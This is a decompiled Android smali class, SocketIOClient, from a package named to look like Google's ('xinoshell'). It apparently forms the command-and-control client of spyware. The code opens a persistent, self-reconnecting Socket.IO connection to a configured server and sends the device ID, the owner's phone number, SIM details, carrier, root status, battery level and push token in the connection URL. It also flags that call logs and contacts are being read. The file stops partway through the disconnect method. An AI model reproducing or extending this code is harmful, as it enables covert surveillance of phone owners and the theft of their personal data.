.class public Lcom/google/xinoshell/connection/SocketIOClient;
.super Ljava/lang/Object;
.source "SocketIOClient.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;
    }
.end annotation


# static fields
.field private static final INITIAL_RECONNECTION_DELAY_MS:J = 0x1388L

.field private static final MAX_RECONNECT_DELAY_MS:J = 0xea60L

.field private static final PING_EVENT:Ljava/lang/String; = "ping"

.field private static final PONG_EVENT:Ljava/lang/String; = "pong"

.field private static volatile instance:Lcom/google/xinoshell/connection/SocketIOClient;


# instance fields
.field private volatile isConnected:Z

.field private volatile isConnecting:Z

.field private final mContext:Landroid/content/Context;

.field private mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

.field private mReconnectDelay:J

.field private mSocket:Lio/socket/client/Socket;

.field private final onConnect:Lio/socket/emitter/Emitter$Listener;

.field private final onConnectError:Lio/socket/emitter/Emitter$Listener;

.field private final onDisconnect:Lio/socket/emitter/Emitter$Listener;

.field private final onPing:Lio/socket/emitter/Emitter$Listener;

.field private prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

.field private reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;


# direct methods
.method private constructor <init>(Landroid/content/Context;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;

    .line 59
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 34
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    .line 35
    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 37
    const-wide/16 v0, 0x1388

    iput-wide v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mReconnectDelay:J

    .line 264
    new-instance v0, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onConnect:Lio/socket/emitter/Emitter$Listener;

    .line 274
    new-instance v0, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda1;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onDisconnect:Lio/socket/emitter/Emitter$Listener;

    .line 284
    new-instance v0, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda2;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda2;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onConnectError:Lio/socket/emitter/Emitter$Listener;

    .line 294
    new-instance v0, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda3;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda3;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onPing:Lio/socket/emitter/Emitter$Listener;

    .line 60
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    .line 61
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 62
    new-instance v0, Lcom/google/xinoshell/connection/SocketIOClient$1;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/connection/SocketIOClient$1;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    .line 73
    .local v0, "networkChangeListener":Lcom/google/xinoshell/receivers/NetworkChangeReceiver$NetworkChangeListener;
    invoke-static {v0}, Lcom/google/xinoshell/receivers/NetworkChangeReceiver;->setNetworkChangeListener(Lcom/google/xinoshell/receivers/NetworkChangeReceiver$NetworkChangeListener;)V

    .line 74
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->initializeSocket()V

    .line 75
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->setupReconnectionExecutor()V

    .line 76
    return-void
.end method

.method private buildConnectionUrl()Ljava/lang/String;
    .locals 9

    .line 108
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->getConnectionParams()Ljava/util/Map;

    move-result-object v0

    .line 109
    .local v0, "params":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    new-instance v1, Ljava/lang/StringBuilder;

    sget-object v2, Lcom/google/xinoshell/utils/Config;->WsServerUrl:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 111
    .local v1, "urlBuilder":Ljava/lang/StringBuilder;
    sget-object v2, Lcom/google/xinoshell/utils/Config;->WsServerUrl:Ljava/lang/String;

    const-string v3, "?"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    .line 113
    .local v2, "hasQuery":Z
    const-string v4, "&"

    if-nez v2, :cond_0

    .line 114
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 115
    :cond_0
    sget-object v5, Lcom/google/xinoshell/utils/Config;->WsServerUrl:Ljava/lang/String;

    invoke-virtual {v5, v3}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    sget-object v3, Lcom/google/xinoshell/utils/Config;->WsServerUrl:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 116
    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 119
    :cond_1
    :goto_0
    const/4 v3, 0x1

    .line 120
    .local v3, "firstParam":Z
    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_1
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_3

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/util/Map$Entry;

    .line 121
    .local v6, "entry":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    if-nez v3, :cond_2

    .line 122
    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 124
    :cond_2
    invoke-interface {v6}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 125
    const-string v8, "="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    .line 126
    invoke-interface {v6}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    invoke-static {v8}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 127
    const/4 v3, 0x0

    .line 128
    .end local v6    # "entry":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    goto :goto_1

    .line 130
    :cond_3
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    return-object v4
.end method

.method private getConnectionParams()Ljava/util/Map;
    .locals 18
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/Map<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 134
    move-object/from16 v0, p0

    new-instance v1, Lcom/google/xinoshell/utils/DeviceInfoUtil;

    iget-object v2, v0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/google/xinoshell/utils/DeviceInfoUtil;-><init>(Landroid/content/Context;)V

    .line 135
    .local v1, "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    .line 136
    .local v2, "model":Ljava/lang/String;
    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getAndroidVersion()Ljava/lang/String;

    move-result-object v3

    .line 137
    .local v3, "androidVersion":Ljava/lang/String;
    iget-object v4, v0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v4}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 138
    .local v4, "deviceID":Ljava/lang/String;
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->isRooted()Z

    move-result v5

    .line 139
    .local v5, "isRooted":Z
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->isSDCardAvailable()Z

    move-result v6

    .line 140
    .local v6, "isSDCardAvailable":Z
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getStorageMemory()Ljava/lang/String;

    move-result-object v7

    .line 141
    .local v7, "storageMemory":Ljava/lang/String;
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getSDKVersion()I

    move-result v8

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v8

    .line 142
    .local v8, "sdkVersion":Ljava/lang/String;
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getCPUArchitecture()Ljava/lang/String;

    move-result-object v9

    .line 143
    .local v9, "cpuArchitecture":Ljava/lang/String;
    invoke-virtual {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getServiceProvider()Ljava/lang/String;

    move-result-object v10

    .line 144
    .local v10, "serviceProvider":Ljava/lang/String;
    iget-object v11, v0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v11}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getSelfNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v11

    .line 145
    .local v11, "phoneNumber":Ljava/lang/String;
    iget-object v12, v0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v12}, Lcom/google/xinoshell/utils/BatteryUtils;->getBatteryPercentage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    .line 146
    .local v12, "batteryPercentage":Ljava/lang/String;
    iget-object v13, v0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v13}, Lcom/google/xinoshell/utils/SimInfoUtil;->getSimInfo(Landroid/content/Context;)Lorg/json/JSONArray;

    move-result-object v13

    .line 148
    .local v13, "simArr":Lorg/json/JSONArray;
    new-instance v14, Ljava/util/HashMap;

    invoke-direct {v14}, Ljava/util/HashMap;-><init>()V

    .line 149
    .local v14, "params":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    const-string v15, "userId"

    move-object/from16 v16, v1

    .end local v1    # "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    .local v16, "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    sget-object v1, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-interface {v14, v15, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 150
    const-string v1, "deviceId"

    invoke-interface {v14, v1, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 151
    const-string v1, "modelName"

    invoke-interface {v14, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 152
    const-string v1, "androidV"

    invoke-interface {v14, v1, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 153
    const-string v1, "isRoot"

    invoke-static {v5}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v15

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 154
    const-string v1, "isSdCard"

    invoke-static {v6}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v15

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 155
    const-string v1, "storage"

    invoke-interface {v14, v1, v7}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 156
    const-string v1, "sdkV"

    invoke-interface {v14, v1, v8}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 157
    const-string v1, "cpu_arch"

    invoke-interface {v14, v1, v9}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 158
    const-string v1, "service_provider"

    invoke-interface {v14, v1, v10}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 159
    const-string v1, "mobNo"

    invoke-interface {v14, v1, v11}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 160
    iget-object v1, v0, Lcom/google/xinoshell/connection/SocketIOClient;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v15, "fcm_token"

    invoke-virtual {v1, v15}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v14, v15, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 161
    const-string v1, "battery"

    invoke-interface {v14, v1, v12}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 162
    const-string v1, "simData"

    invoke-virtual {v13}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 163
    const-string v1, "type"

    const-string v15, "client"

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 164
    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v15

    move/from16 v17, v1

    const-string v1, "isReadCallLogs"

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 165
    const-string v1, "isReadContacts"

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v15

    invoke-interface {v14, v1, v15}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 166
    return-object v14
.end method

.method public static declared-synchronized getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/SocketIOClient;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    const-class v0, Lcom/google/xinoshell/connection/SocketIOClient;

    monitor-enter v0

    .line 49
    :try_start_0
    sget-object v1, Lcom/google/xinoshell/connection/SocketIOClient;->instance:Lcom/google/xinoshell/connection/SocketIOClient;

    if-nez v1, :cond_1

    .line 50
    const-class v1, Lcom/google/xinoshell/connection/SocketIOClient;

    monitor-enter v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 51
    :try_start_1
    sget-object v2, Lcom/google/xinoshell/connection/SocketIOClient;->instance:Lcom/google/xinoshell/connection/SocketIOClient;

    if-nez v2, :cond_0

    .line 52
    new-instance v2, Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-direct {v2, p0}, Lcom/google/xinoshell/connection/SocketIOClient;-><init>(Landroid/content/Context;)V

    sput-object v2, Lcom/google/xinoshell/connection/SocketIOClient;->instance:Lcom/google/xinoshell/connection/SocketIOClient;

    .line 54
    :cond_0
    monitor-exit v1

    goto :goto_0

    :catchall_0
    move-exception v2

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v2

    .line 56
    :cond_1
    :goto_0
    sget-object v1, Lcom/google/xinoshell/connection/SocketIOClient;->instance:Lcom/google/xinoshell/connection/SocketIOClient;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    monitor-exit v0

    return-object v1

    .line 48
    .end local p0    # "context":Landroid/content/Context;
    :catchall_1
    move-exception p0

    :try_start_3
    monitor-exit v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    throw p0
.end method

.method private initializeSocket()V
    .locals 6

    .line 84
    :try_start_0
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->buildConnectionUrl()Ljava/lang/String;

    move-result-object v0

    .line 85
    .local v0, "connectionUrl":Ljava/lang/String;
    new-instance v1, Lio/socket/client/IO$Options;

    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V

    .line 86
    .local v1, "options":Lio/socket/client/IO$Options;
    const/4 v2, 0x1

    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z

    .line 87
    const/16 v3, 0xa

    iput v3, v1, Lio/socket/client/IO$Options;->reconnectionAttempts:I

    .line 88
    const-wide/16 v3, 0x3e8

    iput-wide v3, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J

    .line 89
    const-wide/16 v3, 0x1388

    iput-wide v3, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 90
    const-wide/16 v3, 0x4e20

    iput-wide v3, v1, Lio/socket/client/IO$Options;->timeout:J

    .line 91
    iput-boolean v2, v1, Lio/socket/client/IO$Options;->forceNew:Z

    .line 92
    iput-boolean v2, v1, Lio/socket/client/IO$Options;->upgrade:Z

    .line 93
    iput-boolean v2, v1, Lio/socket/client/IO$Options;->rememberUpgrade:Z

    .line 94
    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    const-string v4, "websocket"

    const/4 v5, 0x0

    aput-object v4, v3, v5

    const-string v4, "polling"

    aput-object v4, v3, v2

    iput-object v3, v1, Lio/socket/client/IO$Options;->transports:[Ljava/lang/String;

    .line 95
    invoke-static {v0, v1}, Lio/socket/client/IO;->socket(Ljava/lang/String;Lio/socket/client/IO$Options;)Lio/socket/client/Socket;

    move-result-object v2

    iput-object v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    .line 97
    iget-object v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    const-string v3, "connect"

    iget-object v4, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onConnect:Lio/socket/emitter/Emitter$Listener;

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 98
    iget-object v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    const-string v3, "disconnect"

    iget-object v4, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onDisconnect:Lio/socket/emitter/Emitter$Listener;

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 99
    iget-object v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    const-string v3, "connect_error"

    iget-object v4, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onConnectError:Lio/socket/emitter/Emitter$Listener;

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 100
    iget-object v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    const-string v3, "ping"

    iget-object v4, p0, Lcom/google/xinoshell/connection/SocketIOClient;->onPing:Lio/socket/emitter/Emitter$Listener;

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 104
    nop

    .line 105
    .end local v0    # "connectionUrl":Ljava/lang/String;
    .end local v1    # "options":Lio/socket/client/IO$Options;
    return-void

    .line 102
    :catch_0
    move-exception v0

    .line 103
    .local v0, "e":Ljava/net/URISyntaxException;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

.method private scheduleReconnection()V
    .locals 5

    .line 210
    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    if-nez v0, :cond_0

    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    if-nez v0, :cond_0

    .line 211
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    new-instance v1, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda5;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda5;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    iget-wide v2, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mReconnectDelay:J

    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface {v0, v1, v2, v3, v4}, Ljava/util/concurrent/ScheduledExecutorService;->schedule(Ljava/lang/Runnable;JLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 216
    :cond_0
    return-void
.end method

.method private setupReconnectionExecutor()V
    .locals 1

    .line 79
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    .line 80
    return-void
.end method

.method public static startConnection(Landroid/content/Context;)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .line 297
    invoke-static {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/SocketIOClient;

    move-result-object v0

    .line 298
    .local v0, "client":Lcom/google/xinoshell/connection/SocketIOClient;
    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 299
    return-void
.end method


# virtual methods
.method public declared-synchronized connect()V
    .locals 5

    monitor-enter p0

    .line 170
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 171
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 172
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    if-eqz v1, :cond_0

    .line 173
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    invoke-interface {v1, v0}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onConnectionStateChanged(Z)V

    .line 175
    .end local p0    # "this":Lcom/google/xinoshell/connection/SocketIOClient;
    :cond_0
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->scheduleReconnection()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 176
    monitor-exit p0

    return-void

    .line 179
    :cond_1
    :try_start_1
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-nez v0, :cond_2

    .line 180
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->initializeSocket()V

    .line 183
    :cond_2
    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    if-nez v0, :cond_3

    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    if-nez v0, :cond_3

    .line 184
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 185
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;

    .line 186
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    new-instance v1, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda4;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/connection/SocketIOClient$$ExternalSyntheticLambda4;-><init>(Lcom/google/xinoshell/connection/SocketIOClient;)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x14

    invoke-interface {v0, v1, v3, v4, v2}, Ljava/util/concurrent/ScheduledExecutorService;->schedule(Ljava/lang/Runnable;JLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 193
    :cond_3
    monitor-exit p0

    return-void

    .line 169
    :catchall_0
    move-exception v0

    :try_start_2
    monitor-exit p0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    throw v0
.end method

.method public destroy()V
    .locals 4

    .line 302
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->disconnect()V

    .line 303
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    if-eqz v0, :cond_1

    .line 304
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    invoke-interface {v0}, Ljava/util/concurrent/ScheduledExecutorService;->shutdown()V

    .line 306
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x1

    invoke-interface {v0, v2, v3, v1}, Ljava/util/concurrent/ScheduledExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 307
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    invoke-interface {v0}, Ljava/util/concurrent/ScheduledExecutorService;->shutdownNow()Ljava/util/List;
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 312
    :cond_0
    goto :goto_0

    .line 309
    :catch_0
    move-exception v0

    .line 310
    .local v0, "e":Ljava/lang/InterruptedException;
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->reconnectExecutor:Ljava/util/concurrent/ScheduledExecutorService;

    invoke-interface {v1}, Ljava/util/concurrent/ScheduledExecutorService;->shutdownNow()Ljava/util/List;

    .line 311
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Thread;->interrupt()V

    .line 314
    .end local v0    # "e":Ljava/lang/InterruptedException;
    :cond_1
    :goto_0
    return-void
.end method

.method public declared-synchronized disconnect()V
    .locals 1

    monitor-enter p0

    .line 196
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

